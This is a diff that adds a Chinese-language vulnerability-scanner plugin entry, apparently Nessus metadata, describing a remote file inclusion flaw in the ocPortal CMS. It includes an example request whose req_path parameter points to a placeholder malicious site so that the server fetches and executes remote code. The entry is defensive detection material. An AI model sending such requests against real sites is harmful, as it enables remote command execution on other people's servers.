@@ -1,0 +1,8 @@
+[CHINESE]
+ID=15468
+NAME=ocPortal远程文件包含漏洞
+CATEGORY=信息搜集
+FAMILY=CGI漏洞
+SUMMARY=确定ocPortal是否可以包含第三方文件
+DESCRIPTION=远程主机正在运行ocPortal--一个PHP编写的内容管理系统.;;此软件在'index.php'文件存在一个文件包含漏洞，攻击者利用这个漏洞在在远程主机上执行任意命令.;;攻击者可发出这样一个请求 :;;	http://www.example.com/index.php?req_path=http://[恶意站点]/;;;此请求将使远程脚本包含第三方站点的'funcs.php' 文件并执行此文件.;;;解决方案 : 升级到最新的版本;风险等级 : 高
+COPYRIGHT=This script is Copyright (C) 2004 Tenable Network Security
